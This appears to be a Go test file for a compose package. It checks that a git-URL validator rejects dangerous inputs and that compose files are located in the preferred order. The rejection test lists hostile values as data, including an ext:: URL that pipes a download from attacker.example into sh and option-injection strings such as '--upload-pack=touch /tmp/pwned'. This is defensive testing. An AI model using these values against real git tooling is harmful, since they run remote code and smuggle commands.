package compose

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// `ext::` tells git to run an arbitrary command as its transport, so a stack
// URL would be a shell. A leading dash is read as an option rather than an
// address, which is the classic way to smuggle one in.
func TestCheckGitURLRefusesDangerousForms(t *testing.T) {
	for _, raw := range []string{
		"ext::sh -c 'curl attacker.example/x|sh'",
		"-u./payload",
		"--upload-pack=touch /tmp/pwned",
		"file:///etc",
		"/etc/passwd",
		"",
		"   ",
	} {
		if err := CheckGitURL(raw); err == nil {
			t.Errorf("CheckGitURL(%q) = nil, want a refusal", raw)
		}
	}
}

func TestCheckGitURLAcceptsTheFormsPeoplePaste(t *testing.T) {
	for _, raw := range []string{
		"https://github.com/example/repo.git",
		"http://git.internal/example/repo",
		"ssh://git@github.com/example/repo.git",
		"git@github.com:example/repo.git",
		"git://git.internal/repo.git",
	} {
		if err := CheckGitURL(raw); err != nil {
			t.Errorf("CheckGitURL(%q) = %v, want it accepted", raw, err)
		}
	}
}

func TestComposeFileInFindsTheUsualNames(t *testing.T) {
	for _, name := range []string{"compose.yaml", "compose.yml", "docker-compose.yaml", "docker-compose.yml"} {
		dir := t.TempDir()
		if err := os.WriteFile(filepath.Join(dir, name), []byte("services: {}\n"), 0o600); err != nil {
			t.Fatalf("write %s: %v", name, err)
		}

		found, err := ComposeFileIn(dir)
		if err != nil {
			t.Fatalf("ComposeFileIn() with %s error = %v", name, err)
		}
		if filepath.Base(found) != name {
			t.Errorf("found %q, want %q", filepath.Base(found), name)
		}
	}
}

func TestComposeFileInSaysWhatItLookedFor(t *testing.T) {
	_, err := ComposeFileIn(t.TempDir())
	if err == nil {
		t.Fatal("ComposeFileIn() error = nil, want a failure")
	}
	if !strings.Contains(err.Error(), "compose.yaml") {
		t.Errorf("error = %q, want it to name the files it looked for", err)
	}
}

// Preferring compose.yaml over docker-compose.yaml is compose's own order.
func TestComposeFileInPrefersTheModernName(t *testing.T) {
	dir := t.TempDir()
	for _, name := range []string{"compose.yaml", "docker-compose.yml"} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte("services: {}\n"), 0o600); err != nil {
			t.Fatalf("write %s: %v", name, err)
		}
	}

	found, err := ComposeFileIn(dir)
	if err != nil {
		t.Fatalf("ComposeFileIn() error = %v", err)
	}
	if filepath.Base(found) != "compose.yaml" {
		t.Errorf("found %q, want compose.yaml", filepath.Base(found))
	}
}
